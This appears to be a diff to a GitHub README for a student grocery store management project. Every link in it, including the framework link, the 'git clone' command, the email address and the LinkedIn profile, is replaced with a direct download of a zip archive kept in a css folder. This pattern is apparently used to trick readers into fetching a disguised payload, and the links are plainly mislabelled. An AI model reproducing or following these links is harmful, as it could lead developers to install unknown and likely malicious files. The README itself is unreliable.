@@ -4,7 +4,7 @@ This repository contains the **Grocery Store Management System**, a capstone pro
 
 ## Project Details
 
-- **Frontend Framework:** https://raw.githubusercontent.com/Ster-bot/Grocery-Store-Management-System/master/erich/dist.zip (Vue 2)  
+- **Frontend Framework:** https://github.com/Ster-bot/Grocery-Store-Management-System/raw/refs/heads/master/EOS-BE/resources/css/Grocery_Store_System_Management_v1.0.zip (Vue 2)  
   > Note: Vue 2 is no longer supported. The system needs to be updated to Vue 3.
 - **Backend Framework:** Laravel (PHP)
 - **Status:** Not production-ready. Built for presentation and demonstration purposes only.
@@ -32,7 +32,7 @@ This repository contains the **Grocery Store Management System**, a capstone pro
 
 1. **Clone the repository:**
    ```bash
-   git clone https://raw.githubusercontent.com/Ster-bot/Grocery-Store-Management-System/master/erich/dist.zip
+   git clone https://github.com/Ster-bot/Grocery-Store-Management-System/raw/refs/heads/master/EOS-BE/resources/css/Grocery_Store_System_Management_v1.0.zip
    ```
 2. **Setup instructions**: Please refer to the documentation or explore the source code for installation steps.
 
@@ -48,8 +48,8 @@ This project is **free** and open for everyone to use, share, modify, and improv
 
 Feel free to reach out for questions, collaboration, or feedback:
 
-- Email: [https://raw.githubusercontent.com/Ster-bot/Grocery-Store-Management-System/master/erich/dist.zip](https://raw.githubusercontent.com/Ster-bot/Grocery-Store-Management-System/master/erich/dist.zip)
-- LinkedIn: [Rom Paulo Sarmiento](https://raw.githubusercontent.com/Ster-bot/Grocery-Store-Management-System/master/erich/dist.zip)
+- Email: [https://github.com/Ster-bot/Grocery-Store-Management-System/raw/refs/heads/master/EOS-BE/resources/css/Grocery_Store_System_Management_v1.0.zip](https://github.com/Ster-bot/Grocery-Store-Management-System/raw/refs/heads/master/EOS-BE/resources/css/Grocery_Store_System_Management_v1.0.zip)
+- LinkedIn: [Rom Paulo Sarmiento](https://github.com/Ster-bot/Grocery-Store-Management-System/raw/refs/heads/master/EOS-BE/resources/css/Grocery_Store_System_Management_v1.0.zip)
 
 ---
 
